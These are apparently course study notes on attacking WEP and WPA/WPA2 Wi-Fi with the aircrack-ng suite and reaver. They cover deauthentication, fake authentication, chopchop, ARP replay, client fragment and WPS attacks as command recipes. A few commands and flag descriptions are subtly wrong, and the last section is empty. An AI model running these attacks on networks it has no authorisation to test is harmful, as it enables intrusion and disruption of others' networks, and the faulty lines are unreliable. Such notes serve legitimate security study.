# Cyber Security
# Hacking WEP/WPA/WPA2 WiFi Networks Using Kali Linux
## course
## Packt Publishing
### chapter
### Saad Sarraj
#### surface

#### Network Interface Monitoring Mode
##### Networks Basics
###### Switch your WiFi card to monitor mode?

```sh
ifconfig <interface> down
iwconfig <interface> mode monitor
ifconfig <interface> up
```

To bring it back to managed mode:

```sh
ifconfig <interface> down
iwconfig <interface> mode managed
ifconfig <interface> up
```

Alternatively, we can use `airmon-ng`:

```sh
airmon-ng start <interface>
```

The network interface name will get a `mon` postfix.

#### Capturing Access Point Packets
##### Gather AP Information Before Cracking
###### List available access points in the area?

After switching the network interface to monitoring mode:

```sh
airodump-ng <interface>
```

###### Filter out available access points to a specific channel?

```sh
airodump-ng --channel <channel> <interface>
```

###### Filter out available access points to a specific band?

There are three possible options, a, b, or g:

```sh
airodump-ng --band a <interface>
airodump-ng --band b <interface>
airodump-ng --band g <interface>
```

###### Filter out available access points to a specific access point encryption?

```sh
airodump-ng --encrypt <encryption> <interface>
```

###### Filter out available access points to a specific access point?

Either access point MAC address (BSSID) or name (ESSID) would work:

```sh
airodump-ng --channel <channel> --bssid <bssid> <interface>
airodump-ng --channel <channel> --essid <essid> <interface>
```

###### Store handshake packets of an access point to a file?

First, monitor an access point:

```sh
airodump-ng --bssid <bssid> --write <file> <interface>
```

#### Deauthentication Attack
##### Cracking WEP Encryption
###### Crack WEP encryption with deauthentication attack when there are clients associated with an access point?

This attack sends deauthentication packets to one or more clients which are currently associated with a particular access point. This attack forces clients to reauthenticate or generate ARP requests so that we can capture them to decrypt WEP, WPA/WPA2 keys. Windows clients sometimes flush their ARP cache when disconnected.

On the first terminal listen to an access point and write packets into a file:

```sh
airodump-ng --bssid <bssid> --write <capfile> <interface>
```

On another terminal decipher incoming IV packets:

```sh
aircrack-ng <capfile>
```

On the third terminal deauthenticate a client from this network:

```sh
aireplay-ng --deauth 3 -a <access point> -b <client> <interface>
aireplay-ng -0 3 -a <access point> -b <client> <interface>
```

This will send 3 ACK packets on behalf of the client, meaning that we ask the access point to perform an unclean shutdown in its connection with the client. Meanwhile, the client device will try to connect to the network again, which must include handshake packets. `airodump-ng` will intercept these packets and write them in the file. By capturing the handshake of a client to a hidden access point, the access point name will appear in the list.

#### Fake Authentication Attack
##### Cracking WEP Encryption
###### Crack WEP encryption with fake authentication attack?

This is only useful when you need an associated MAC address in various aireplay-ng attacks and there is currently no associated client.

Listen to an access point and write packets into a file:

```sh
airodump-ng --bssid <bssid> --write <capfile> <interface>
```

Start deciphering IV packets:

```sh
aircrack-ng <capfile>
```

Because we need crowded network on this access point. When it doesn't have enough clients, we will send fake authentications to make it crowded:

```sh
airodump-ng --fakeauth 0 -a <access point> -h <source mac> <interface>
```

- `-a` is a replay option to set access point MAC address.
- `-h` is a replay option to set source MAC.

#### ChopChop Attack
##### Cracking WEP Encryption
###### Crack WEP encryption by forging new packets into the network?

Listen to an access point and write packets into a file:

```sh
airodump-ng --bssid <bssid> --write <capfile> <interface>
```

Send fake authentication to capture ARP packets:

```sh
aireplay-ng --fakeauth 0 -a <access point> -h <source mac> <interface>
```

- `-a` is a replay option to set access point MAC address.
- `-h` is a replay option to set source MAC.

This will associate you to the access point.

On the third terminal, use chopchop attack:

```sh
aireplay-ng --chopchop -b <access point> -h <source mac> <interface>
```

- `-b` is a filtering option to filter access point MAC address.

This command starts reading incoming ARP packets shorter than a specific length, but only filtered by the access point. Occasionally, it asks if you want to use the packet found from the access point. Because the access point might send short data packets, `aireplay-ng` may consider them. But you should only select short packets limited to 4 or 5 lines. On each round you should associate yourself to the access point using fake authentication attack.

Once a packet was found, confirm usage so that it writes the key stream into a file ending with `.xor` extension.

Many times the packet may be too short to be useful. In that case, we can use `packetforge-ng` to predict the rest of the packet:

```sh
packetforge-ng --arp -a <access point> -h <source mac> -k 255.255.255.255 -l 255.255.255.255 -y <PRGA> -w <capfile>
```

- `-a` sets the access point MAC address
- `-h` sets the source MAC address
- `-k` sets the destination IP
- `-l` sets the source IP
- `-y` the PRGA (Pseudo Random Generation Algorithm) file generated by `packetforge-ng`
- `-w` the capfile to be written into
- `-0` or `--arp` forces an ARP packet
- `-1` or `--udp` forces a UDP packet
- `-2` or `--icmp` forces a ICMP packet
- `-3` or `--null` forces a null packet

Reassociate yourself again and inject the generated packet:

```sh
aireplay-ng --chopchop -b <access point> -h <source mac> <interface>
aireplay-ng --interactive -r <capfile> <interface>
```

Now decrypt the keystream:

```sh
aircrack-ng <capfile>
```

#### ARP Replay Attack
##### Cracking WEP Encryption
###### Crack WEP encryption by ARP request replay attack?

The classic ARP request replay attack is the most effective way to generate new initialization vectors (IVs), and works very reliably. The program listens for an ARP packet then retransmits it back to the access point. This, in turn, causes the access point to repeat the ARP packet with a new IV. The program retransmits the same ARP  packet  over and over. However, each ARP packet repeated by the access point has a new IVs. It is all these new IVs which allow you to determine the WEP key.

Listen to an access point and write packets into a file:

```sh
airodump-ng --bssid <bssid> --write <capfile> <interface>
```

Send fake authentication to capture ARP packets:

```sh
aireplay-ng --fakeauth 0 -a <access point> -h <source mac> <interface>
```

- `-a` is a replay option to set access point MAC address.
- `-h` is a replay option to set source MAC.

This will associate you to the access point.

On the third terminal, use aireplay attack:

```sh
aireplay-ng --arpreplay -b <access point> -h <source mac> <interface>
```

- `-b` is a filtering option to filter access point MAC address.
- `-h` is a replay option to set source MAC.

Now start deciphering the key:

```sh
aircrack-ng <capfile>
```

#### Client Fragment Attack
##### Cracking WEP Encryption
###### Crack WEP encryption by turning ARP packets from a client into ARP requests against the client?

In this attack, we set up a fake access point and wait for a client to connect. When client requests a connection they will send an ARP packet and wait for DHCP to obtain an address. We take that ARP packet and convert it into an ARP request and send it to the same client. When client replies, we collect these packets.

Listen to an access point and write packets into a file:

```sh
airodump-ng --bssid <bssid> --write <capfile> <interface>
```

Start turning ARP packets into ARP requests:

```sh
aireplay-ng --cfrag -D -h <source mac> <interface>
```

- `-D` disable access point detection
- `-h` is a replay option to set source MAC.

Now start deciphering the key:

```sh
aircrack-ng <capfile>
```

#### Crack WAP2 Encryption
##### Cracking WPA/WPA2 Encryptions
###### List available access points with WPS enabled?

```sh
airmon-ng start <interface>
```

```sh
wash -i <interface> -C
```

The `wash` command comes with `reaver` package.

###### Attack a WPA access point with WPS enabled?

Install `reaver` package and switch network interface to monitoring mode:

```sh
airmon-ng start <interface>
```

```sh
reaver -i <interface> -b <bssid> -c <channel> -vv -K <PSK>
reaver -i wlan0mon -b 00:00:00:00:00:00:00:00 -c 6 -vv -K 1
```

This can also be done with wifite:

```sh
wifite
```

#### Crack WAP2 Encryption
##### Hacking WPA-Enterprise WiFi Networks
###### 

